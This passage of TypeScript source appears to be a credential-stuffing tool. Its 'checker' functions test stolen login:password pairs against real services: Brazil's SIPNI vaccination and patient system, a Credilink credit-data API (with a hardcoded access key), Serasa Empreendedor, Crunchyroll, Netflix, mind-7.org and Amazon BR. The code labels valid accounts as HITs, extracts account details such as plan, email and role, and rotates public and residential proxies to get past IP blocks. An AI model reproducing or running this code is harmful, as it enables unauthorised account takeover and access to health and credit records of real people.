        return { credential, login, status: "HIT", detail: extractCCDetail(body) };
      }
    }

    return { credential, login, status: "FAIL", detail: "unknown_response" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /* ok */ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  MIND-7 CHECKER — https://mind-7.org/acesso/
//  Note: site is behind Cloudflare managed JS challenge (not bypassed via curl).
//  All attempts will return ERROR:CLOUDFLARE_CHALLENGE.
// ═══════════════════════════════════════════════════════════════════════════════
const MIND7_URL     = "https://mind-7.org/acesso/";
const MIND7_TIMEOUT = 15_000;

async function checkMind7(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/m7_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        "-H", "Sec-CH-UA: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\"",
        "-H", "Sec-CH-UA-Mobile: ?0",
        "-H", "Sec-CH-UA-Platform: \"Windows\"",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Site: none",
        MIND7_URL,
      ], MIND7_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    // Detect Cloudflare challenge
    const isCFChallenge =
      getResult.statusCode === 403 ||
      getResult.statusCode === 503 ||
      getResult.body.includes("_cf_chl_opt") ||
      getResult.body.includes("cf-mitigated") ||
      getResult.body.includes("Just a moment") ||
      getResult.body.includes("Enable JavaScript and cookies");

    if (isCFChallenge) {
      return { credential, login, status: "ERROR", detail: "CLOUDFLARE_CHALLENGE" };
    }

    // If we somehow got past CF, try to POST
    const postBody = `username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}`;
    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", `Referer: ${MIND7_URL}`,
        "-H", "Origin: https://mind-7.org",
        "--data-raw", postBody,
        "--max-redirs", "5",
        MIND7_URL,
      ], MIND7_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const loc = postResult.location;
    if (loc && !loc.includes("/acesso") && !loc.includes("/login")) {
      return { credential, login, status: "HIT", detail: loc };
    }
    return { credential, login, status: "FAIL", detail: "credentials_invalid" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /* ok */ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SIPNI CHECKER (v2) — https://sipni.datasus.gov.br (4-step JSF AJAX flow)
//  Logic: GET page → partial AJAX POST 1 → update ViewState → partial AJAX POST 2
//         → follow redirect XML → GET pacientes page → verify markers
// ═══════════════════════════════════════════════════════════════════════════════
const SIPNI_URL          = "https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf";
const SIPNI_PACIENTES    = "https://sipni.datasus.gov.br/si-pni-web/faces/paciente/listarPaciente.jsf";
const SIPNI_TIMEOUT      = 25_000;

async function checkSipni(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/sipni_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page ────────────────────────────────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-k", "--compressed",
        "-c", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "-H", "Connection: keep-alive",
        "-H", "DNT: 1",
        SIPNI_URL,
      ], SIPNI_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
    }

    const html      = getResult.body;
    const viewState = extractViewState(html);
    const formId    = extractFormId(html);
    const submitId  = extractSubmitId(html, formId);
    const senhaHash = sha512(password);

    if (!formId || !submitId) {
      return { credential, login, status: "ERROR", detail: "NO_FORM_FOUND" };
    }

    // ── Step 2: Partial AJAX POST 1 (authenticate) ───────────────────────────
    const ajaxBody1 = [
      "javax.faces.partial.ajax=true",
      `javax.faces.source=${encodeURIComponent(submitId)}`,
      `javax.faces.partial.execute=${encodeURIComponent(submitId)}`,
      "javax.faces.behavior.event=click",
      "javax.faces.partial.event=click",
      `${encodeURIComponent(formId)}=${encodeURIComponent(formId)}`,
      `javax.faces.ViewState=${encodeURIComponent(viewState)}`,
      `${encodeURIComponent(`${formId}:usuario`)}=${encodeURIComponent(login)}`,
      `${encodeURIComponent(`${formId}:senha`)}=${encodeURIComponent(senhaHash)}`,
      `${encodeURIComponent(submitId)}=${encodeURIComponent(submitId)}`,
      "AJAXREQUEST=_viewRoot",
    ].join("&");

    let post1: CurlResult;
    try {
      post1 = await runCurl([
        "-k", "--compressed",
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "-H", `Origin: https://sipni.datasus.gov.br`,
        "-H", `Referer: ${SIPNI_URL}`,
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Faces-Request: partial/ajax",
        "-H", "Accept: application/xml, text/xml, */*; q=0.01",
        "--data-raw", ajaxBody1,
        "--max-redirs", "0",
        SIPNI_URL,
      ], SIPNI_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `AJAX1_ERROR:${String(e)}` };
    }

    const xml1 = post1.body;

    // Detect wrong credentials early
    if (xml1.toLowerCase().includes("usu") && xml1.toLowerCase().includes("ou senha inv")) {
      return { credential, login, status: "FAIL", detail: "usuario_ou_senha_invalidos" };
    }
    if (xml1.toLowerCase().includes("acesso negado") || xml1.toLowerCase().includes("bloqueado")) {
      return { credential, login, status: "ERROR", detail: "BLOCK_AJAX1" };
    }

    // Extract updated ViewState from XML response
    let newViewState = viewState;
    const vsFromCData = xml1.match(/<update[^>]+javax\.faces\.ViewState[^>]*><!\[CDATA\[(.*?)\]\]><\/update>/);
    const vsFromAttr  = xml1.match(/id="javax\.faces\.ViewState"\s+value="([^"]+)"/);
    if (vsFromCData)    newViewState = vsFromCData[1];
    else if (vsFromAttr) newViewState = vsFromAttr[1];

    // ── Step 3: Partial AJAX POST 2 (complete login) ─────────────────────────
    const ajaxBody2 = [
      "javax.faces.partial.ajax=true",
      `javax.faces.source=${encodeURIComponent(submitId)}`,
      "javax.faces.partial.execute=%40all",
      `${encodeURIComponent(submitId)}=${encodeURIComponent(submitId)}`,
      `${encodeURIComponent(formId)}=${encodeURIComponent(formId)}`,
      `javax.faces.ViewState=${encodeURIComponent(newViewState)}`,
      `${encodeURIComponent(`${formId}:usuario`)}=${encodeURIComponent(login)}`,
      `${encodeURIComponent(`${formId}:senha`)}=${encodeURIComponent(senhaHash)}`,
    ].join("&");

    let post2: CurlResult;
    try {
      post2 = await runCurl([
        "-k", "--compressed",
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "-H", `Origin: https://sipni.datasus.gov.br`,
        "-H", `Referer: ${SIPNI_URL}`,
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Faces-Request: partial/ajax",
        "-H", "Accept: application/xml, text/xml, */*; q=0.01",
        "--data-raw", ajaxBody2,
        "--max-redirs", "0",
        SIPNI_URL,
      ], SIPNI_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `AJAX2_ERROR:${String(e)}` };
    }

    const xml2 = post2.body;

    // Detect wrong credentials (sometimes appears in step 2 as well)
    if (xml2.toLowerCase().includes("usu") && xml2.toLowerCase().includes("ou senha inv")) {
      return { credential, login, status: "FAIL", detail: "usuario_ou_senha_invalidos_step2" };
    }

    // Extract redirect URL from XML: <redirect url="..."></redirect>
    const redirectMatch = xml2.match(/<redirect\s+url="([^"]+)"><\/redirect>/);
    const redirectUrl   = redirectMatch
      ? (redirectMatch[1].startsWith("/")
          ? `https://sipni.datasus.gov.br${redirectMatch[1]}`
          : redirectMatch[1])
      : null;

    if (!redirectUrl) {
      // No redirect in XML — might still be an inline failure
      const xml2Low = xml2.toLowerCase();
      if (xml2Low.includes("inicio.jsf") || xml2Low.includes("type=\"password\"") || xml2Low.includes("j_idt23:senha")) {
        return { credential, login, status: "FAIL", detail: "no_redirect_still_on_login" };
      }
      // Ambiguous — fall through to pacientes check
    }

    // ── Step 4: Verify access via pacientes page ──────────────────────────────
    // If we got a redirect URL that's not the login page, follow it
    // Then hit the pacientes URL to confirm session
    const targetUrl = redirectUrl && !redirectUrl.includes("inicio.jsf") ? redirectUrl : SIPNI_PACIENTES;
    let finalResult: CurlResult;
    try {
      finalResult = await runCurl([
        "-k", "-s",
        "-b", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-L",          // follow redirects
        "--max-redirs", "5",
        targetUrl,
      ], SIPNI_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `FINAL_GET_ERROR:${String(e)}` };
    }

    const finalText = finalResult.body.toLowerCase();

    // LIVE markers
    const liveMarkers = ["pacienteform", "pesquisa de paciente", "listapacientetable",
                         "nenhum paciente encontrado", "cartão sus", "cadastrar paciente"];
    for (const m of liveMarkers) {
      if (finalText.includes(m)) {
        return { credential, login, status: "HIT", detail: "sipni_dashboard" };
      }
    }

    // Heuristic: page is large and doesn't look like the login screen → likely a valid session
    if (finalResult.body.length > 5000 && !finalText.includes("type=\"password\"") && !finalText.includes("inicio.jsf")) {
      return { credential, login, status: "HIT", detail: "large_page_no_login_form" };
    }

    // DIE markers
    const dieMarkers = ["usuário ou senha inválidos", "senha incorreta", "sua sessão expirou",
                        "efetue o login", "problemas para se logar?", "j_idt23:senha", "j_idt26:senha"];
    for (const m of dieMarkers) {
      if (finalText.includes(m)) return { credential, login, status: "FAIL", detail: `die_marker:${m.slice(0,30)}` };
    }

    if (finalText.includes("type=\"password\"") || finalText.includes("inicio.jsf")) {
      return { credential, login, status: "FAIL", detail: "redirected_to_login" };
    }

    if (finalResult.body.length < 1000) {
      return { credential, login, status: "ERROR", detail: "response_too_short" };
    }

    return { credential, login, status: "FAIL", detail: "no_markers_found" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CREDILINK CHECKER — app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net
//  Logic: POST JSON → check idToken in response
//         Handle "UserHasSessionActive" by invalidating old session first.
// ═══════════════════════════════════════════════════════════════════════════════
const CREDILINK_AUTH_URL = "https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net/credicorp/api/user/authenticate";
const CREDILINK_BASE_URL = "https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net";
const CREDILINK_TIMEOUT  = 20_000;
const CREDILINK_PRODUCT  = "84";
const CREDILINK_KEY      = "YXRlbmFAcm9vdDphdGVuYUBCUTJhSiM2VEIyaWI=";

async function checkCrediLink(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const body       = JSON.stringify({
    login,
    password,
    productId:  CREDILINK_PRODUCT,
    accessKey:  CREDILINK_KEY,
    ip:         "0.0.0.0",
  });

  const attempt = async (): Promise<CurlResult> => runCurl([
    "-k", "-s",
    "-X", "POST",
    "-H", "Content-Type: application/json",
    "-H", `User-Agent: ${DESKTOP_UA}`,
    "-d", body,
    CREDILINK_AUTH_URL,
  ], CREDILINK_TIMEOUT);

  try {
    let result = await attempt();

    if (result.statusCode === 0 || result.statusCode >= 502) {
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    }

    let json: Record<string, unknown>;
    try { json = JSON.parse(result.body.trim()); }
    catch { return { credential, login, status: "ERROR", detail: "INVALID_JSON" }; }

    // Handle "UserHasSessionActive" — invalidate old session then retry
    const details = Array.isArray(json.details) ? json.details as Record<string, unknown>[] : [];
    if (details[0]?.detailedMessage === "UserHasSessionActive") {
      const action = details[0]?.action as Record<string, string> | undefined;
      const href   = action?.href;
      const tk     = action?.temporaryToken;
      if (href && tk) {
        // Invalidate session
        await runCurl([
          "-k", "-s",
          "-X", "POST",
          "-H", `Authorization: Bearer ${tk}`,
          "-H", `User-Agent: ${DESKTOP_UA}`,
          `${CREDILINK_BASE_URL}/credicorp/api${href}`,
        ], CREDILINK_TIMEOUT).catch(() => void 0);
        // Retry auth
        result = await attempt();
        try { json = JSON.parse(result.body.trim()); }
        catch { return { credential, login, status: "ERROR", detail: "RETRY_INVALID_JSON" }; }
      }
    }

    // HIT: token received
    const idToken = json.idToken;
    if (idToken && typeof idToken === "string" && idToken.length > 0) {
      // Decode JWT payload for user info (base64url, no crypto needed)
      let detail = "token_ok";
      try {
        const parts  = idToken.split(".");
        const pad    = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
        const payload = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
        const name  = (payload.name ?? payload.nome ?? json.name ?? json.nome ?? "") as string;
        const email = (payload.email ?? json.email ?? "") as string;
        const role  = (payload.role ?? payload.perfil ?? payload.profile ?? "") as string;
        const parts2: string[] = [];
        if (name)  parts2.push(name.trim().slice(0, 40));
        if (email && email !== login) parts2.push(email.slice(0, 40));
        if (role)  parts2.push(`perfil:${String(role).slice(0, 20)}`);
        if (parts2.length) detail = parts2.join(" | ");
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }

    // Common error codes
    const msg = String(json.message ?? json.erro ?? json.status ?? "").toLowerCase();
    if (msg.includes("invalid") || msg.includes("inválid") || msg.includes("incorret") || result.statusCode === 401) {
      return { credential, login, status: "FAIL", detail: `auth_failed:${msg.slice(0, 60)}` };
    }

    if (result.statusCode === 400 || result.statusCode === 403) {
      return { credential, login, status: "FAIL", detail: `http_${result.statusCode}:${msg.slice(0, 60)}` };
    }

    return { credential, login, status: "FAIL", detail: result.body.trim().slice(0, 120) };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `CREDILINK_EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SERASA EMPREENDEDOR CHECKER — https://www.serasaempreendedor.com.br/login
//  Original Python checker used Selenium (headless Chrome) because the main
//  Serasa page is a React SPA. HOWEVER, the OAuth redirect chain ends at the
//  identity-provider login page which IS server-rendered HTML (Keycloak/SSO).
//  Strategy:
//    Step 1: GET /login → follow ALL redirects → land on SSO HTML form page
//    Step 2: Extract form action URL + any hidden tokens from SSO HTML
//    Step 3: POST credentials to the form action URL (SSO server-side)
//    Step 4: Follow post-login redirects → detect dashboard vs error page
// ═══════════════════════════════════════════════════════════════════════════════
const SERASA_URL     = "https://www.serasaempreendedor.com.br/login";
const SERASA_TIMEOUT = 30_000;

async function checkSerasa(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/serasa_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page, follow all SSO redirects ─────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-k", "--compressed", "-L", "--max-redirs", "12",
        "-c", cookieFile, "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Site: none",
        SERASA_URL,
      ], SERASA_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
    }

    const html = getResult.body;

    // ── Detect if we have a server-rendered login form (SSO/Keycloak) ─────────
    const hasUsernameField = html.includes('id="username"') || html.includes("name=\"username\"") ||
                             html.includes("id='username'") || html.includes("name='username'");
    const hasPasswordField = html.includes('type="password"') || html.includes("type='password'");

    if (!hasUsernameField || !hasPasswordField) {
      // The page is still a JS-only SPA at this point — Selenium would be needed
      return { credential, login, status: "ERROR", detail: "SELENIUM_REQUIRED:js_only_login" };
    }

    // ── Extract the form action URL (Keycloak uses absolute URLs here) ────────
    const formActionMatch =
      html.match(/<form[^>]+action=["']([^"']+)["']/i) ||
      html.match(/action=["']([^"']+)["'][^>]*method=["']post["']/i);

    let formAction = formActionMatch?.[1] ?? "";
    if (!formAction) {
      return { credential, login, status: "ERROR", detail: "NO_FORM_ACTION" };
    }
    // Decode HTML entities (&amp; → &)
    formAction = formAction.replace(/&amp;/g, "&");
    // Resolve relative form action using the SSO domain from a known redirect pattern
    if (!formAction.startsWith("http")) {
      const ssoBase = getResult.headers["content-location"] ??
                      "https://www.serasaempreendedor.com.br";
      formAction = `${ssoBase.replace(/\/$/, "")}${formAction.startsWith("/") ? "" : "/"}${formAction}`;
    }

    // ── Extract hidden tokens (Keycloak session code, execution, etc.) ────────
    const hiddenInputs: Record<string, string> = {};
    const hiddenRe = /<input[^>]+type=["']hidden["'][^>]*>/gi;
    let hm: RegExpExecArray | null;
    while ((hm = hiddenRe.exec(html)) !== null) {
      const nameM  = hm[0].match(/name=["']([^"']+)["']/);
      const valueM = hm[0].match(/value=["']([^"']*?)["']/);
      if (nameM) hiddenInputs[nameM[1]] = valueM?.[1] ?? "";
    }

    // ── Step 2: POST credentials to SSO form action ───────────────────────────
    const postFields: Record<string, string> = {
      ...hiddenInputs,
      username: login,
      password,
      credentialId: "",
    };
    const postBody = Object.entries(postFields)
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join("&");

    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-k", "--compressed", "-L", "--max-redirs", "10",
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", `Referer: ${formAction}`,
        "-H", "Origin: https://www.serasaempreendedor.com.br",
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Site: same-origin",
        "--data-raw", postBody,
        formAction,
      ], SERASA_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const body = postResult.body;
    const bLow = body.toLowerCase();

    // ── HIT markers (post-login dashboard) ────────────────────────────────────
    if (bLow.includes("bem-vindo ao nosso tour") || bLow.includes("comprar créditos") ||
        bLow.includes("comprar creditos") || bLow.includes("meu perfil") ||
        bLow.includes("consultas realizadas") || bLow.includes("créditos disponíveis") ||
        bLow.includes("saldo disponível") || bLow.includes("painel")) {
      return { credential, login, status: "HIT", detail: "serasa_dashboard" };
    }

    // ── FAIL markers ──────────────────────────────────────────────────────────
    if (bLow.includes("verifique se o usu") || bLow.includes("senha foram digitados") ||
        bLow.includes("usuário ou senha incorretos") || bLow.includes("credenciais inválidas") ||
        bLow.includes("invalid credentials") || bLow.includes("invalid_grant") ||
        bLow.includes("account is disabled") || bLow.includes("user not found")) {
      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
    }

    // ── Still on SSO login page (wrong creds but no explicit message) ─────────
    if ((bLow.includes('id="username"') || bLow.includes("name=\"username\"")) &&
        bLow.includes('type="password"')) {
      return { credential, login, status: "FAIL", detail: "still_on_login_page" };
    }

    if (body.length < 500) {
      return { credential, login, status: "ERROR", detail: "response_too_short" };
    }

    return { credential, login, status: "FAIL", detail: "unknown_response" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CRUNCHYROLL CHECKER — OAuth2 password grant via Android client
//  Routed through residential proxy (cloud IPs blocked / DNS fails)
//  POST https://auth.crunchyroll.com/auth/v1/token
// ═══════════════════════════════════════════════════════════════════════════════
const CR_CLIENT_B64  = Buffer.from("cr_android2:").toString("base64");
const CR_UA          = "Crunchyroll/3.46.2 Android/13 okhttp/4.12.0";
const CR_TIMEOUT     = 25_000;

async function checkCrunchyroll(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const crArgs = (px: string[]) => [
    "--compressed", "--http1.1", "-L", "--max-redirs", "3",
    ...px,
    "-H", `User-Agent: ${CR_UA}`,
    "-H", `Authorization: Basic ${CR_CLIENT_B64}`,
    "-H", "Content-Type: application/x-www-form-urlencoded",
    "--data-raw", `grant_type=password&username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}&scope=offline_access`,
    "https://auth.crunchyroll.com/auth/v1/token",
  ];
  try {
    // Try public proxies first (3 attempts), then fall back to residential
    let result: CurlResult;
    try {
      result = await runCurlWithProxyRetry(crArgs, CR_TIMEOUT, 3);
    } catch (proxyErr) {
      // Public proxies failed (PROXY_ERR) — fall back to residential
      result = await runCurlResidential(crArgs, CR_TIMEOUT);
    }

    if (result.statusCode === 200 && result.body.includes("access_token")) {
      let detail = "authenticated";
      try {
        const j = JSON.parse(result.body) as Record<string, unknown>;
        const parts: string[] = [];
        if (j.account_id)   parts.push(`uid:${j.account_id}`);
        if (j.country)      parts.push(`país:${j.country}`);
        // Decode access_token JWT for subscription tier
        if (typeof j.access_token === "string") {
          try {
            const pad     = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
            const tkParts = (j.access_token as string).split(".");
            const tkPay   = JSON.parse(Buffer.from(pad(tkParts[1]), "base64").toString("utf8")) as Record<string, unknown>;
            const tier    = tkPay.subscription_type ?? tkPay.tier ?? tkPay.plan ?? "";
            if (tier) parts.push(`plano:${String(tier).slice(0, 20)}`);
            const email = tkPay.email ?? "";
            if (email && String(email) !== login) parts.push(String(email).slice(0, 40));
          } catch { /**/ }
        }
        if (parts.length) detail = parts.join(" | ");
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }
    if (result.statusCode === 401 || result.statusCode === 400) {
      let detail = "invalid_credentials";
      try {
        const j = JSON.parse(result.body) as Record<string, unknown>;
        const e = j.error ?? j.code ?? "";
        if (e) detail = String(e).slice(0, 60);
      } catch { /**/ }
      return { credential, login, status: "FAIL", detail };
    }
    const bLow = result.body.toLowerCase();
    if (bLow.includes("account_not_found") || bLow.includes("user_not_found"))
      return { credential, login, status: "FAIL", detail: "account_not_found" };
    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    if (bLow.includes("blocked") || result.statusCode === 403)
      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${result.body.slice(0, 80)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  NETFLIX CHECKER — Extract BUILD_IDENTIFIER → POST to Shakti API
//  Works directly (no proxy needed — Netflix accessible from datacenter IPs)
// ═══════════════════════════════════════════════════════════════════════════════
const NF_TIMEOUT = 35_000;

async function checkNetflix(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/nf_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
  try {
    // Step 1 — GET login page (direct — residential proxy blocks Netflix entirely)
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "--compressed", "-L", "--max-redirs", "5",
        "-c", cookieFile, "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        "https://www.netflix.com/br/login",
      ], NF_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    const html = getResult.body;
    const buildMatch = html.match(/"BUILD_IDENTIFIER"\s*:\s*"([^"]+)"/);
    if (!buildMatch) {
      if (html.length < 200) return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
      return { credential, login, status: "ERROR", detail: "NO_BUILD_ID" };
    }
    const buildId = buildMatch[1];
    // Decode JSON string escapes: \/ → / , \xNN → char, \uNNNN → char
    const rawAuth = (html.match(/"authURL"\s*:\s*"([^"]+)"/) ?? [])[1] ?? "";
    const authURL = rawAuth
      .replace(/\\\//g, "/")
      .replace(/\\x([0-9a-fA-F]{2})/g, (_, h) => String.fromCharCode(parseInt(h, 16)))
      .replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));

    // Step 2 — POST credentials to Shakti API
    // Netflix Shakti blocks datacenter IPs with 421 — use proxy with automatic retry
    const nfBody = JSON.stringify({
      userLoginId: login, password, rememberMe: true,
      flow: "websiteSignUp", mode: "login", action: "loginAction",
      withFields: "rememberMe,nextPage,userLoginId,password,countryCode,currentFlowContext",
      authURL, nextPage: "", showPassword: "",
    });
    let postResult: CurlResult;
    try {
      // Try direct connection first — residential proxy was returning 403.
      // If direct gets 421 (datacenter IP rejected), fall through to proxy retry.
      postResult = await runCurl([
        "--compressed", "--http1.1", "-L", "--max-redirs", "3",
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/json",
        "-H", "Referer: https://www.netflix.com/br/login",
        "-H", "Origin: https://www.netflix.com",
        "-H", "Accept: application/json, text/javascript",
        "-H", "X-Netflix.is.user.unauthenticated: true",
        "--data-raw", nfBody,
        `https://www.netflix.com/api/shakti/${buildId}/login`,
      ], NF_TIMEOUT);
      // If direct IP is geo-blocked (421), retry with proxy
      if (postResult.statusCode === 421 || postResult.statusCode === 403) {
        postResult = await runCurlWithProxyRetry(px => [
          "--compressed", "--http1.1", "-L", "--max-redirs", "3",
          ...px,
          "-b", cookieFile, "-c", cookieFile,
          "-H", `User-Agent: ${DESKTOP_UA}`,
          "-H", "Content-Type: application/json",
          "-H", "Referer: https://www.netflix.com/br/login",
          "-H", "Origin: https://www.netflix.com",
          "-H", "Accept: application/json, text/javascript",
          "-H", "X-Netflix.is.user.unauthenticated: true",
          "--data-raw", nfBody,
          `https://www.netflix.com/api/shakti/${buildId}/login`,
        ], NF_TIMEOUT, 4);
      }
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const body = postResult.body;
    const bLow = body.toLowerCase();
    if (bLow.includes('"result":"login"') || bLow.includes('"membertype"') || bLow.includes('"account":')) {
      let detail = "netflix_authenticated";
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const res = (j.result === "login" ? j : j) as Record<string, unknown>;
        // Extract from top-level or nested customerData/account
        const member = (res.membershipStatus ?? (res.customerData as Record<string, unknown>)?.membershipStatus ?? "") as string;
        const plan   = (res.planName       ?? (res.customerData as Record<string, unknown>)?.planName ?? "") as string;
        const country= (res.countryOfSignup ?? (res.customerData as Record<string, unknown>)?.countryOfSignup ?? "") as string;
        const parts: string[] = [];
        if (member && member !== "CURRENT_MEMBER") parts.push(member.toLowerCase());
        else if (member) parts.push("ativo");
        if (plan)    parts.push(`plano:${plan.slice(0, 25)}`);
        if (country) parts.push(`país:${country}`);
        if (parts.length) detail = parts.join(" | ");
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }
    if (bLow.includes("incorretemailpassword") || bLow.includes("incorrect_password") ||
        bLow.includes("invalidpassword") || bLow.includes("emailfield.invalidemailaddress") ||
        bLow.includes("invalid_email_or_password"))
      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
    if (bLow.includes("too many") || bLow.includes("rate limit"))
      return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
    if (postResult.statusCode === 421)
      return { credential, login, status: "ERROR", detail: "RESIDENTIAL_IP_REQUIRED:shakti_421" };
    if (postResult.statusCode === 403 || bLow.includes("blocked") || bLow.includes("proibido"))
      return { credential, login, status: "ERROR", detail: "PROXY_IP_BLOCKED:403" };
    if (postResult.statusCode === 0 || postResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
    return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  AMAZON PRIME VIDEO CHECKER — 2-step form scrape (residential proxy)
//  Amazon BR login flow:
//    Step 1: GET signin page → POST email only → land on password page
//    Step 2: POST password → check for authenticated home page
// ═══════════════════════════════════════════════════════════════════════════════
const AMZ_TIMEOUT = 40_000;
const AMZ_SIGNIN  = "https://www.amazon.com.br/ap/signin?openid.pape.max_auth_age=0"
  + "&openid.return_to=https%3A%2F%2Fwww.amazon.com.br%2F"
  + "&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
  + "&openid.assoc_handle=braflex&openid.mode=checkid_setup"
